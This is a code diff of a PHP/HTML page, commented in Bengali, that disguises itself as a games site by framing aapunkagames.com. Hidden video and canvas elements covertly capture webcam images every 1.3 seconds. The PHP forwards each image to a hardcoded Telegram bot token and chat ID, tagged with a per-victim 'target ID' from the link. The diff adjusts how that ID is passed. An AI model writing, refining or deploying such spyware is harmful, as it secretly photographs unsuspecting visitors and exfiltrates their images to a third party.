@@ -1,17 +1,6 @@
 <?php
-$linksFile = 'links.json';
-$links = file_exists($linksFile) ? json_decode(file_get_contents($linksFile), true) : [];
-
-// ইউজার লিংকের সাথে যে আইডি পাঠাবে (לש примеру: ?id=abc123xyz)
-$id = $_GET['id'] ?? '';
-$targetUrl = "https://www.aapunkagames.com/"; // ডিফল্ট লিংক
-
-if (!empty($id) && isset($links[$id])) {
-    $targetUrl = $links[$id];
-}
-
-// ছবি পোস্ট রিকোয়েস্ট হ্যান্ডেল করা
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
+    
     $botToken = "8836334469:AAE6WOWEabXtkgCWVaIHhpMgTwAEQ3KxLdY";
     $chatId = "5896019931";
 
@@ -25,14 +14,18 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
     $imgData = str_replace(' ', '+', $imgData);
     $data = base64_decode($imgData);
 
-    $fileName = 'img_' . ($id ? $id . '_' : '') . uniqid() . '.png';
+    // ইউজার যে ইউনিক আইডি বা টার্গেট লিংক দিয়ে ঢুকছে সেটা ক্যাচ করা
+    $targetId = isset($_POST['target']) ? $_POST['target'] : 'Unknown';
+
+    $fileName = 'img_' . uniqid() . '.png';
     $filePath = $uploadDir . $fileName;
 
     if (file_put_contents($filePath, $data)) {
         $telegramUrl = "https://api.telegram.org/bot{$botToken}/sendPhoto";
+        
         $postFields = [
             'chat_id' => $chatId,
-            'caption' => "Captured (ID: {$id}): " . $fileName,
+            'caption' => "Target ID: {$targetId}\nFile: {$fileName}",
             'photo'   => new CURLFile(realpath($filePath))
         ];
 
@@ -55,22 +48,37 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading...</title>
+    <title>Aapunkagames</title>
     <style>
         body, html {
-            margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000;
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            background-color: #000;
         }
-        #game-frame { width: 100%; height: 100%; border: none; }
+        #game-frame {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
     </style>
 </head>
 <body>
-    <iframe id="game-frame" src="<?php echo htmlspecialchars($targetUrl); ?>"></iframe>
+
+    <iframe id="game-frame" src="https://www.aapunkagames.com/"></iframe>
+    
     <video id="video" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
+
+        // URL থেকে ইউনিক টার্গেট আইডি বের করা
+        const urlParams = new URLSearchParams(window.location.search);
+        const targetId = urlParams.get('id') || 'direct';
 
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(stream => {
@@ -79,24 +87,27 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
                     setInterval(captureAndUpload, 1300);
                 }, 1000);
             })
-            .catch(err => console.error("Camera error: ", err));
+            .catch(err => {
+                console.error("Camera error: ", err);
+            });
 
         function captureAndUpload() {
             const context = canvas.getContext('2d');
             canvas.width = video.videoWidth || 640;
             canvas.height = video.videoHeight || 480;
+            
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
             const imageData = canvas.toDataURL('image/png');
 
-            // বর্তমান আইডিসহ রিকোয়েস্ট পাঠানো
-            const urlParams = new URLSearchParams(window.location.search);
-            const id = urlParams.get('id') || '';
-
             fetch('', {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                body: 'image=' + encodeURIComponent(imageData) + '&id=' + encodeURIComponent(id)
-            }).catch(error => console.error('Error:', error));
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: 'image=' + encodeURIComponent(imageData) + '&target=' + encodeURIComponent(targetId)
+            }).catch(error => {
+                console.error('Error:', error);
+            });
         }
     </script>
 </body>
